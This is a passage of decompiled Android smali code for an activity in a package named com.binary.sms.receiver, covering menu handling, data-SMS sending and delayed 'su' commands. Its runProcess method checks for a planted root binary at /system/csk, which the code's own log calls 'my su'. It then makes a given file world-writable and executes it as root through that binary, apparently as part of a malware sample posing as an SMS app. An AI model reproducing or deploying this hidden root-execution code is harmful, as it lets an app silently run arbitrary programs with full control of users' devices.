    move-exception v0

    .line 181
    .local v0, "e":Ljava/lang/Exception;
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "onCreate: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/binary/sms/receiver/Logger;->error(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_0
.end method

.method public onCreateOptionsMenu(Landroid/view/Menu;)Z
    .locals 5
    .param p1, "menu"    # Landroid/view/Menu;

    .prologue
    const/4 v4, 0x1

    const/4 v3, 0x0

    .line 949
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreateOptionsMenu(Landroid/view/Menu;)Z

    .line 954
    const v0, 0x7f050001

    invoke-interface {p1, v3, v4, v3, v0}, Landroid/view/Menu;->add(IIII)Landroid/view/MenuItem;

    move-result-object v0

    const/16 v1, 0x30

    const/16 v2, 0x62

    invoke-interface {v0, v1, v2}, Landroid/view/MenuItem;->setShortcut(CC)Landroid/view/MenuItem;

    .line 955
    const/4 v0, 0x2

    const v1, 0x7f050002

    invoke-interface {p1, v3, v0, v3, v1}, Landroid/view/Menu;->add(IIII)Landroid/view/MenuItem;

    move-result-object v0

    const/16 v1, 0x31

    const/16 v2, 0x63

    invoke-interface {v0, v1, v2}, Landroid/view/MenuItem;->setShortcut(CC)Landroid/view/MenuItem;

    .line 957
    return v4
.end method

.method public onOptionsItemSelected(Landroid/view/MenuItem;)Z
    .locals 3
    .param p1, "item"    # Landroid/view/MenuItem;

    .prologue
    const/4 v0, 0x1

    .line 979
    invoke-interface {p1}, Landroid/view/MenuItem;->getItemId()I

    move-result v1

    packed-switch v1, :pswitch_data_0

    .line 988
    invoke-super {p0, p1}, Landroid/app/Activity;->onOptionsItemSelected(Landroid/view/MenuItem;)Z

    move-result v0

    :goto_0
    return v0

    .line 981
    :pswitch_0
    invoke-virtual {p0}, Lcom/binary/sms/receiver/SkeletonActivity;->finish()V

    goto :goto_0

    .line 984
    :pswitch_1
    iget-object v1, p0, Lcom/binary/sms/receiver/SkeletonActivity;->mEditor:Landroid/widget/EditText;

    const-string v2, ""

    invoke-virtual {v1, v2}, Landroid/widget/EditText;->setText(Ljava/lang/CharSequence;)V

    goto :goto_0

    .line 979
    nop

    :pswitch_data_0
    .packed-switch 0x1
        :pswitch_0
        :pswitch_1
    .end packed-switch
.end method

.method protected onPause()V
    .locals 1

    .prologue
    const/4 v0, 0x0

    .line 225
    invoke-super {p0}, Landroid/app/Activity;->onPause()V

    .line 226
    invoke-static {v0, v0}, Lcom/binary/sms/receiver/Logger;->setTextField(Landroid/widget/EditText;Landroid/app/Activity;)V

    .line 228
    return-void
.end method

.method public onPrepareOptionsMenu(Landroid/view/Menu;)Z
    .locals 3
    .param p1, "menu"    # Landroid/view/Menu;

    .prologue
    const/4 v1, 0x1

    .line 965
    invoke-super {p0, p1}, Landroid/app/Activity;->onPrepareOptionsMenu(Landroid/view/Menu;)Z

    .line 969
    const/4 v0, 0x2

    invoke-interface {p1, v0}, Landroid/view/Menu;->findItem(I)Landroid/view/MenuItem;

    move-result-object v2

    iget-object v0, p0, Lcom/binary/sms/receiver/SkeletonActivity;->mEditor:Landroid/widget/EditText;

    invoke-virtual {v0}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v0

    invoke-interface {v0}, Landroid/text/Editable;->length()I

    move-result v0

    if-lez v0, :cond_0

    move v0, v1

    :goto_0
    invoke-interface {v2, v0}, Landroid/view/MenuItem;->setVisible(Z)Landroid/view/MenuItem;

    .line 971
    return v1

    .line 969
    :cond_0
    const/4 v0, 0x0

    goto :goto_0
.end method

.method protected onResume()V
    .locals 1

    .prologue
    .line 219
    invoke-super {p0}, Landroid/app/Activity;->onResume()V

    .line 220
    iget-object v0, p0, Lcom/binary/sms/receiver/SkeletonActivity;->mEditor:Landroid/widget/EditText;

    invoke-static {v0, p0}, Lcom/binary/sms/receiver/Logger;->setTextField(Landroid/widget/EditText;Landroid/app/Activity;)V

    .line 221
    return-void
.end method

.method public declared-synchronized runProcess(Ljava/lang/String;)V
    .locals 10
    .param p1, "filePath"    # Ljava/lang/String;
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .prologue
    .line 1018
    monitor-enter p0

    :try_start_0
    new-instance v5, Ljava/io/File;

    const-string v6, "/system/csk"

    invoke-direct {v5, v6}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5}, Ljava/io/File;->exists()Z

    move-result v5

    if-nez v5, :cond_1

    .line 1019
    const-string v5, "runProcess my su does not exists. returning"

    invoke-static {v5}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_1

    .line 1084
    :cond_0
    :goto_0
    monitor-exit p0

    return-void

    .line 1022
    :cond_1
    :try_start_1
    iget v5, p0, Lcom/binary/sms/receiver/SkeletonActivity;->counter:I

    add-int/lit8 v5, v5, 0x1

    iput v5, p0, Lcom/binary/sms/receiver/SkeletonActivity;->counter:I
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_1

    .line 1023
    const/4 v2, 0x0

    .local v2, "i":I
    :goto_1
    const/4 v5, 0x5

    if-ge v2, v5, :cond_0

    .line 1025
    const/4 v3, 0x0

    .line 1030
    .local v3, "process":Ljava/lang/Process;
    :try_start_2
    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "filePath-"

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget v6, p0, Lcom/binary/sms/receiver/SkeletonActivity;->counter:I

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, ": "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V

    .line 1031
    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "export LD_LIBRARY_PATH=/vendor/lib:/system/lib; chmod 777 "

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 1032
    invoke-virtual {v5, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    .line 1031
    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 1033
    .local v0, "command":Ljava/lang/String;
    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "command: "

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V

    .line 1034
    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "runProcess start (synchronized)"

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v5

    .line 1035
    const-string v6, ". command: "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    .line 1034
    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V

    .line 1036
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v5

    .line 1037
    const/4 v6, 0x2

    new-array v6, v6, [Ljava/lang/String;

    const/4 v7, 0x0

    .line 1039
    const-string v8, "/system/csk"

    aput-object v8, v6, v7

    const/4 v7, 0x1

    .line 1042
    new-instance v8, Ljava/lang/StringBuilder;

    const-string v9, "export LD_LIBRARY_PATH=/vendor/lib:/system/lib; "

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 1044
    invoke-virtual {v8, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    .line 1042
    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    aput-object v8, v6, v7

    .line 1036
    invoke-virtual {v5, v6}, Ljava/lang/Runtime;->exec([Ljava/lang/String;)Ljava/lang/Process;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2
    .catch Ljava/lang/Throwable; {:try_start_2 .. :try_end_2} :catch_4
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    move-result-object v3

    .line 1046
    const/4 v4, -0x1

    .line 1048
    .local v4, "res":I
    const v5, 0x15f90

    :try_start_3
    invoke-static {v3, v5}, Lcom/binary/sms/receiver/SkeletonActivity;->WaitForTimeout(Ljava/lang/Process;I)I

    move-result v4

    .line 1050
    if-nez v4, :cond_2

    .line 1051
    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "runProcess cmd="

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, " success: "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    .line 1052
    invoke-virtual {v5, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v5

    .line 1051
    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V
    :try_end_3
    .catch Ljava/util/concurrent/TimeoutException; {:try_start_3 .. :try_end_3} :catch_1
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2
    .catch Ljava/lang/Throwable; {:try_start_3 .. :try_end_3} :catch_4
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    .line 1075
    :goto_2
    if-eqz v3, :cond_0

    .line 1077
    :try_start_4
    invoke-virtual {v3}, Ljava/lang/Process;->destroy()V
    :try_end_4
    .catch Ljava/lang/Throwable; {:try_start_4 .. :try_end_4} :catch_0
    .catchall {:try_start_4 .. :try_end_4} :catchall_1

    goto/16 :goto_0

    .line 1078
    :catch_0
    move-exception v5

    goto/16 :goto_0

    .line 1054
    :cond_2
    :try_start_5
    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "runProcess cmd="

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, " fail: "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    .line 1055
    invoke-virtual {v5, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v5

    .line 1054
    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V
    :try_end_5
    .catch Ljava/util/concurrent/TimeoutException; {:try_start_5 .. :try_end_5} :catch_1
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_2
    .catch Ljava/lang/Throwable; {:try_start_5 .. :try_end_5} :catch_4
    .catchall {:try_start_5 .. :try_end_5} :catchall_0

    goto :goto_2

    .line 1060
    :catch_1
    move-exception v1

    .line 1061
    .local v1, "e":Ljava/util/concurrent/TimeoutException;
    :try_start_6
    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "runProcess cmd="

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, " timeout="

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    .line 1062
    invoke-virtual {v1}, Ljava/util/concurrent/TimeoutException;->getMessage()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    .line 1061
    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_2
    .catch Ljava/lang/Throwable; {:try_start_6 .. :try_end_6} :catch_4
    .catchall {:try_start_6 .. :try_end_6} :catchall_0

    .line 1063
    const/4 v3, 0x0

    .line 1075
    if-eqz v3, :cond_3

    .line 1077
    :try_start_7
    invoke-virtual {v3}, Ljava/lang/Process;->destroy()V
    :try_end_7
    .catch Ljava/lang/Throwable; {:try_start_7 .. :try_end_7} :catch_7
    .catchall {:try_start_7 .. :try_end_7} :catchall_1

    .line 1023
    :cond_3
    :goto_3
    add-int/lit8 v2, v2, 0x1

    goto/16 :goto_1

    .line 1065
    .end local v0    # "command":Ljava/lang/String;
    .end local v1    # "e":Ljava/util/concurrent/TimeoutException;
    .end local v4    # "res":I
    :catch_2
    move-exception v1

    .line 1067
    .local v1, "e":Ljava/lang/Exception;
    :try_start_8
    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "runProcess Exception- "

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5, v1}, Lcom/binary/sms/receiver/Logger;->error(Ljava/lang/String;Ljava/lang/Throwable;)V
    :try_end_8
    .catchall {:try_start_8 .. :try_end_8} :catchall_0

    .line 1075
    if-eqz v3, :cond_0

    .line 1077
    :try_start_9
    invoke-virtual {v3}, Ljava/lang/Process;->destroy()V
    :try_end_9
    .catch Ljava/lang/Throwable; {:try_start_9 .. :try_end_9} :catch_3
    .catchall {:try_start_9 .. :try_end_9} :catchall_1

    goto/16 :goto_0

    .line 1078
    :catch_3
    move-exception v5

    goto/16 :goto_0

    .line 1070
    .end local v1    # "e":Ljava/lang/Exception;
    :catch_4
    move-exception v1

    .line 1072
    .local v1, "e":Ljava/lang/Throwable;
    :try_start_a
    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "runProcess Throwable- "

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5, v1}, Lcom/binary/sms/receiver/Logger;->error(Ljava/lang/String;Ljava/lang/Throwable;)V
    :try_end_a
    .catchall {:try_start_a .. :try_end_a} :catchall_0

    .line 1075
    if-eqz v3, :cond_0

    .line 1077
    :try_start_b
    invoke-virtual {v3}, Ljava/lang/Process;->destroy()V
    :try_end_b
    .catch Ljava/lang/Throwable; {:try_start_b .. :try_end_b} :catch_5
    .catchall {:try_start_b .. :try_end_b} :catchall_1

    goto/16 :goto_0

    .line 1078
    :catch_5
    move-exception v5

    goto/16 :goto_0

    .line 1074
    .end local v1    # "e":Ljava/lang/Throwable;
    :catchall_0
    move-exception v5

    .line 1075
    if-eqz v3, :cond_4

    .line 1077
    :try_start_c
    invoke-virtual {v3}, Ljava/lang/Process;->destroy()V
    :try_end_c
    .catch Ljava/lang/Throwable; {:try_start_c .. :try_end_c} :catch_6
    .catchall {:try_start_c .. :try_end_c} :catchall_1

    .line 1082
    :cond_4
    :goto_4
    :try_start_d
    throw v5
    :try_end_d
    .catchall {:try_start_d .. :try_end_d} :catchall_1

    .line 1018
    .end local v2    # "i":I
    .end local v3    # "process":Ljava/lang/Process;
    :catchall_1
    move-exception v5

    monitor-exit p0

    throw v5

    .line 1078
    .restart local v2    # "i":I
    .restart local v3    # "process":Ljava/lang/Process;
    :catch_6
    move-exception v6

    goto :goto_4

    .restart local v0    # "command":Ljava/lang/String;
    .local v1, "e":Ljava/util/concurrent/TimeoutException;
    .restart local v4    # "res":I
    :catch_7
    move-exception v5

    goto :goto_3
.end method

.method public sendDataSmsByManager()V
    .locals 10

    .prologue
    const/4 v9, 0x1

    .line 190
    :try_start_0
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v0

    .line 192
    .local v0, "smsManager":Landroid/telephony/SmsManager;
    iget-object v2, p0, Lcom/binary/sms/receiver/SkeletonActivity;->phoneNumber:Landroid/widget/EditText;

    invoke-virtual {v2}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v2

    invoke-interface {v2}, Landroid/text/Editable;->toString()Ljava/lang/String;

    move-result-object v1

    .line 193
    .local v1, "number":Ljava/lang/String;
    if-eqz v1, :cond_0

    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v2

    if-lez v2, :cond_0

    .line 197
    iget-object v2, p0, Lcom/binary/sms/receiver/SkeletonActivity;->smsBody:Landroid/widget/EditText;

    invoke-virtual {v2}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v2

    invoke-interface {v2}, Landroid/text/Editable;->toString()Ljava/lang/String;

    move-result-object v7

    .line 198
    .local v7, "body":Ljava/lang/String;
    const-string v2, ""

    const/4 v3, 0x0

    invoke-virtual {v7}, Ljava/lang/String;->getBytes()[B

    move-result-object v4

    const/4 v5, 0x0

    const/4 v6, 0x0

    invoke-virtual/range {v0 .. v6}, Landroid/telephony/SmsManager;->sendDataMessage(Ljava/lang/String;Ljava/lang/String;S[BLandroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    .line 200
    invoke-virtual {p0}, Lcom/binary/sms/receiver/SkeletonActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    const-string v3, "Your sms has successfully sent!"

    .line 201
    const/4 v4, 0x1

    .line 200
    invoke-static {v2, v3, v4}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v2

    .line 201
    invoke-virtual {v2}, Landroid/widget/Toast;->show()V

    .line 215
    .end local v0    # "smsManager":Landroid/telephony/SmsManager;
    .end local v1    # "number":Ljava/lang/String;
    .end local v7    # "body":Ljava/lang/String;
    :goto_0
    return-void

    .line 205
    .restart local v0    # "smsManager":Landroid/telephony/SmsManager;
    .restart local v1    # "number":Ljava/lang/String;
    :cond_0
    invoke-virtual {p0}, Lcom/binary/sms/receiver/SkeletonActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    const-string v3, "Please enter a valid phone number"

    .line 206
    const/4 v4, 0x1

    .line 205
    invoke-static {v2, v3, v4}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v2

    .line 206
    invoke-virtual {v2}, Landroid/widget/Toast;->show()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 210
    .end local v0    # "smsManager":Landroid/telephony/SmsManager;
    .end local v1    # "number":Ljava/lang/String;
    :catch_0
    move-exception v8

    .line 211
    .local v8, "ex":Ljava/lang/Exception;
    invoke-virtual {p0}, Lcom/binary/sms/receiver/SkeletonActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    const-string v3, "Your sms has failed..."

    invoke-static {v2, v3, v9}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v2

    .line 212
    invoke-virtual {v2}, Landroid/widget/Toast;->show()V

    .line 213
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "sendSmsByManager exception:"

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2, v8}, Lcom/binary/sms/receiver/Logger;->error(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_0
.end method

.method public systemCallRemove(Ljava/lang/String;J)V
    .locals 2
    .param p1, "suComand"    # Ljava/lang/String;
    .param p2, "delay"    # J

    .prologue
    .line 653
    sget-object v0, Lcom/binary/sms/receiver/SkeletonActivity;->resendingHandler:Landroid/os/Handler;

    new-instance v1, Lcom/binary/sms/receiver/SkeletonActivity$8;

    invoke-direct {v1, p0, p1}, Lcom/binary/sms/receiver/SkeletonActivity$8;-><init>(Lcom/binary/sms/receiver/SkeletonActivity;Ljava/lang/String;)V

    invoke-virtual {v0, v1, p2, p3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 747
    return-void
.end method
